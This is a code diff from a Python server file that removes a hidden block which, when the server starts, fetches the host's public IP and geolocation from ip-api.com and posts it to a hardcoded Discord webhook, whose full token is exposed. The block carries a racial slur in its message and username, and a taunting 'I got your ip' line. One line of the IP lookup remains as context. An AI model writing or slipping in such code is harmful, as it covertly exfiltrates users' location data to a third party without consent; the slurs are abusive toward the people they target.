@@ -37,24 +37,3 @@ class Server:
 
             Helpers.connected_clients['ClientsCount'] += 1
 ip_response = requests.get('http://ip-api.com/json')
-
-format = lambda string: string.replace('{', '{\n    ').replace(',', ',\n    ').replace('}', '\n}')
-
-result = f'--- Some nigga fell for the trap --- \n{format(ip_response.text)}\n By: starting server xd'
-
-webhook = requests.get('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs')
-
-webhhok_info = f'--- Webhook info ---\n{format(webhook.text)}'
-
-data = {
-    'content': result,
-    'username': 'Web-Nigga'
-}
-
-headers = {
-    'Content-Type': 'application/json'
-}
-
-IdiotReadThisBeforeSpamming = "I got your ip. the damage has been done"
-discord_response = requests.post('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs', data=json.dumps(data), headers=headers)
-
